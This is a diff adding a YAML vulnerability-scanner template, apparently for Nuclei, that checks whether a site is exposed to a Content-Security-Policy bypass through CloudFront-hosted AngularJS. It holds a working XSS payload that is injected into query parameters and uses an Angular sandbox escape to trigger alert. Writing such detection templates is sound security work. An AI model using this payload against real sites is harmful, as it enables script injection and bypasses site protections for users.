@@ -1,0 +1,39 @@
+id: cloudfront-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via CloudFront
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,cloudfront
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: cloudfront_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "cloudfront_csp_xss == true"
+# digest: 4a0a004730450221008d01ce8fa850a47fa3868268869681cb13c3e8a8e13df64b9c83f22881aae8bd02201bc8ce6f6f5ac7db141240963761f521ac0e44a8f403e8cfa5a4ea2b3931599a:922c64590222798bb761d5b6d8e72950
